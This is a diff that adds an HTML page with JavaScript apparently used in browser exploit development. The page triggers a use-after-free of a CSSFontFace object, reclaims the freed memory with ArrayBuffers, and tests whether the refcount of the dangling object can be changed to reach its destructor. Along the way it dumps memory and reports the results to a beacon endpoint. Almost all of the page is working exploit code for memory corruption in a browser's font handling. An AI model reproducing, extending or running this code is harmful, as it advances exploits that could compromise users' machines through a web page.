@@ -1,0 +1,304 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1224 refcount deref</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:13px/1.4 'Courier New',monospace;padding:10px}
+#s{font-size:18px;font-weight:bold;color:#ffd75e;padding:8px 0}
+#r{color:#ff55c8;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.6}
+</style>
+</head><body>
+<div id="s">P1224 BOOTING...</div>
+<div id="r"></div>
+<script>
+'use strict';
+/* ═══════════════════════════════════════════════════════════════════
+   P1224: Dangling pointer refcount manipulation test
+
+   KEY INSIGHT: We don't need GC to trigger the destructor!
+
+   After CSSFontFace reclaim, the FontFace wrapper's internal pointer
+   points to our ArrayBuffer. If document.fonts.add(wrapper) calls
+   CSSFontFace::ref() through that pointer, it increments OUR buffer!
+
+   TEST PLAN:
+   A) Set refcount=42 in buffer, add wrapper → check if refcount=43
+      (proves ref() dereferences our buffer)
+   B) Set refcount=42, add, delete → check if refcount=42
+      (proves deref() also dereferences our buffer)
+   C) If B works, set refcount=0, add (→1), delete (→0) → DESTRUCTOR
+      (destructor reads member pointers from our buffer!)
+   D) Sentinel scan: place sentinels at all offsets, add/delete,
+      check which offsets were read/written
+   ═══════════════════════════════════════════════════════════════════ */
+
+var S=document.getElementById('s'),R=document.getElementById('r');
+function msg(t){R.textContent+=(R.textContent?'\n':'')+t;}
+
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1224-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+window.onerror=function(m,s,l){B('ERR',m+'@'+l);};
+
+function hex(v){return('0'+v.toString(16)).slice(-2);}
+function hex16(v){return('0000'+v.toString(16)).slice(-4);}
+
+B('START','refcount-deref-test');
+S.textContent='P1224: REFCOUNT DEREF TEST...';
+msg('=== P1224: Dangling pointer refcount manipulation ===');
+msg('');
+
+/* ═══════ STAGE 1: CSSFontFace reclaim (proven pattern) ═══════ */
+var K=8,SIZE=192;
+var s1data=null;
+var hitIdx=-1;
+
+var styleEl=document.createElement('style');
+styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(styleEl);
+var A0=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(A0);
+void A0.loaded;
+window.__alive=[A0]; /* prevent GC */
+
+var firedS1=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(firedS1)return undefined;
+    firedS1=true;
+    /* Free the CSS-side CSSFontFace */
+    if(styleEl)styleEl.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    styleEl=null;
+    document.body.offsetHeight;
+    /* Reclaim with ArrayBuffers */
+    window.__map1=[];
+    for(var k=0;k<K;k++){
+      var ab=new ArrayBuffer(SIZE);
+      window.__map1.push({view:new Uint8Array(ab),bv:new BigUint64Array(ab),ab:ab});
+    }
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+
+document.fonts.load('1em f0, s0','AB').then(function(){
+  B('S1-OK','resolved');
+},function(){});
+
+setTimeout(function(){
+  var m=window.__map1;
+  if(!m||!m.length){B('S1-NOMAP','err');finalize();return;}
+  var best=-1,nz=0;
+  for(var i=0;i<m.length;i++){
+    var v=m[i].view,n=0;
+    for(var j=0;j<v.length;j++)if(v[j]!==0)n++;
+    if(n>nz){nz=n;best=i;}
+  }
+  if(best<0){B('S1-CLEAN','no-hit');finalize();return;}
+
+  hitIdx=best;
+  s1data=new Uint8Array(SIZE);
+  for(var i=0;i<SIZE;i++)s1data[i]=m[best].view[i];
+
+  var p58='';for(var i=0;i<8;i++)p58+=hex(s1data[0x58+i]);
+  var p68='';for(var i=0;i<8;i++)p68+=hex(s1data[0x68+i]);
+  B('S1-HIT','buf'+best+'|nz='+nz+'|p58='+p58+'|p68='+p68);
+  msg('S1 HIT at buf'+best+': p58='+p58+' p68='+p68);
+  msg('');
+
+  /* ═══════ EXPERIMENT A: ref() test ═══════ */
+  msg('=== EXP A: ref() test (refcount 42 → 43?) ===');
+  var tv=m[hitIdx].view;
+
+  /* Set refcount = 42 (0x2A) */
+  tv[0]=42;tv[1]=0;tv[2]=0;tv[3]=0;
+
+  /* Snapshot before */
+  var snapA=new Uint8Array(SIZE);
+  for(var i=0;i<SIZE;i++)snapA[i]=tv[i];
+
+  var rcBefore=tv[0]|(tv[1]<<8)|(tv[2]<<16)|(tv[3]<<24);
+  B('EXPA-BEFORE','rc='+rcBefore);
+
+  /* Add wrapper back to document.fonts */
+  var addOk=false;
+  try{
+    document.fonts.add(A0);
+    addOk=true;
+  }catch(e){
+    B('EXPA-ADD-ERR',e.message||String(e));
+    msg('add() threw: '+(e.message||String(e)));
+  }
+
+  if(addOk){
+    var rcAfterAdd=tv[0]|(tv[1]<<8)|(tv[2]<<16)|(tv[3]<<24);
+    B('EXPA-AFTER-ADD','rc='+rcAfterAdd+'|add='+addOk);
+    msg('after add: rc='+rcAfterAdd+' (expected 43 if ref() works)');
+
+    /* Check all diffs */
+    var diffsA=[];
+    for(var i=0;i<SIZE;i++){
+      if(tv[i]!==snapA[i])diffsA.push('+0x'+hex(i)+'='+hex(snapA[i])+'->'+hex(tv[i]));
+    }
+    if(diffsA.length>0){
+      B('EXPA-DIFFS',diffsA.join(','));
+      msg('changed: '+diffsA.join(' '));
+    }else{
+      B('EXPA-NODIFF','none');
+      msg('NO changes detected');
+    }
+
+    /* ═══════ EXPERIMENT B: deref() test ═══════ */
+    msg('');msg('=== EXP B: deref() test (43 → 42?) ===');
+    var snapB=new Uint8Array(SIZE);
+    for(var i=0;i<SIZE;i++)snapB[i]=tv[i];
+
+    var delOk=false;
+    try{
+      document.fonts.delete(A0);
+      delOk=true;
+    }catch(e){
+      B('EXPB-DEL-ERR',e.message||String(e));
+      msg('delete() threw: '+(e.message||String(e)));
+    }
+
+    if(delOk){
+      var rcAfterDel=tv[0]|(tv[1]<<8)|(tv[2]<<16)|(tv[3]<<24);
+      B('EXPB-AFTER-DEL','rc='+rcAfterDel+'|del='+delOk);
+      msg('after delete: rc='+rcAfterDel+' (expected 42 if deref() works)');
+
+      var diffsB=[];
+      for(var i=0;i<SIZE;i++){
+        if(tv[i]!==snapB[i])diffsB.push('+0x'+hex(i)+'='+hex(snapB[i])+'->'+hex(tv[i]));
+      }
+      if(diffsB.length>0){
+        B('EXPB-DIFFS',diffsB.join(','));
+        msg('changed: '+diffsB.join(' '));
+      }else{
+        B('EXPB-NODIFF','none');
+        msg('NO changes detected');
+      }
+    }
+
+    /* ═══════ EXPERIMENT C: Sentinel scan ═══════ */
+    msg('');msg('=== EXP C: Sentinel scan ===');
+
+    /* Fill buffer with unique sentinels per dword (avoid 0 at refcount) */
+    for(var i=0;i<SIZE;i+=4){
+      var sentinel=0x40+(i/4);
+      tv[i]=sentinel&0xFF;
+      tv[i+1]=(sentinel>>8)&0xFF;
+      tv[i+2]=0;
+      tv[i+3]=0;
+    }
+    /* Set refcount = 99 (high, safe from reaching 0) */
+    tv[0]=99;tv[1]=0;tv[2]=0;tv[3]=0;
+
+    var snapC=new Uint8Array(SIZE);
+    for(var i=0;i<SIZE;i++)snapC[i]=tv[i];
+
+    /* Add and delete to exercise code paths */
+    try{document.fonts.add(A0);}catch(e){B('EXPC-ADD-ERR',e.message);}
+
+    var snapCadd=new Uint8Array(SIZE);
+    for(var i=0;i<SIZE;i++)snapCadd[i]=tv[i];
+
+    try{document.fonts.delete(A0);}catch(e){B('EXPC-DEL-ERR',e.message);}
+
+    /* Find all touched offsets */
+    var touchedAdd=[];
+    for(var i=0;i<SIZE;i++){
+      if(snapCadd[i]!==snapC[i])touchedAdd.push('+0x'+hex(i)+'='+hex(snapC[i])+'->'+hex(snapCadd[i]));
+    }
+    var touchedDel=[];
+    for(var i=0;i<SIZE;i++){
+      if(tv[i]!==snapCadd[i])touchedDel.push('+0x'+hex(i)+'='+hex(snapCadd[i])+'->'+hex(tv[i]));
+    }
+
+    B('EXPC-ADD-TOUCH',touchedAdd.length>0?touchedAdd.join(','):'none');
+    B('EXPC-DEL-TOUCH',touchedDel.length>0?touchedDel.join(','):'none');
+    msg('add touched: '+(touchedAdd.length>0?touchedAdd.join(' '):'none'));
+    msg('del touched: '+(touchedDel.length>0?touchedDel.join(' '):'none'));
+
+    /* ═══════ EXPERIMENT D: document.fonts.check() with our font ═══════ */
+    msg('');msg('=== EXP D: fonts.check() read test ===');
+
+    /* Reset buffer with original data but refcount=50 */
+    for(var i=0;i<SIZE;i++)tv[i]=s1data[i];
+    tv[0]=50;tv[1]=0;tv[2]=0;tv[3]=0;
+
+    var snapD=new Uint8Array(SIZE);
+    for(var i=0;i<SIZE;i++)snapD[i]=tv[i];
+
+    try{document.fonts.add(A0);}catch(e){}
+
+    var checkResult='unknown';
+    try{
+      checkResult=document.fonts.check('1em f0','A');
+    }catch(e){
+      checkResult='err:'+e.message;
+    }
+    B('EXPD-CHECK','result='+checkResult);
+    msg('fonts.check("1em f0","A") = '+checkResult);
+
+    /* Also try load */
+    var loadResult='pending';
+    try{
+      document.fonts.load('1em f0','A').then(function(faces){
+        loadResult='resolved:'+faces.length;
+        B('EXPD-LOAD-OK','faces='+faces.length);
+      },function(e){
+        loadResult='rejected:'+e;
+        B('EXPD-LOAD-FAIL',String(e));
+      });
+    }catch(e){
+      loadResult='err:'+e.message;
+      B('EXPD-LOAD-ERR',e.message);
+    }
+
+    /* Check for any reads/writes during check/load */
+    setTimeout(function(){
+      var diffsD=[];
+      for(var i=0;i<SIZE;i++){
+        if(tv[i]!==snapD[i])diffsD.push('+0x'+hex(i)+'='+hex(snapD[i])+'->'+hex(tv[i]));
+      }
+      var rcD=tv[0]|(tv[1]<<8)|(tv[2]<<16)|(tv[3]<<24);
+      B('EXPD-RESULT','rc='+rcD+'|diffs='+(diffsD.length>0?diffsD.join(','):'none')+'|load='+loadResult);
+      msg('after check+load: rc='+rcD+' diffs='+(diffsD.length>0?diffsD.join(' '):'none'));
+
+      /* Clean up: remove from fonts before finishing */
+      try{document.fonts.delete(A0);}catch(e){}
+
+      /* Final full dump */
+      var fdump='';
+      for(var i=0;i<SIZE;i++)fdump+=hex(tv[i]);
+      B('FINAL-DUMP',fdump.slice(0,900));
+
+      finalize();
+    },200);
+
+  }else{
+    /* add failed, skip remaining experiments */
+    finalize();
+  }
+
+},100);
+
+function finalize(){
+  msg('');msg('=== P1224 COMPLETE ===');
+  S.textContent='P1224 COMPLETE';
+  B('DONE','all');
+}
+
+setTimeout(finalize,30000);
+</script>
+</body></html>
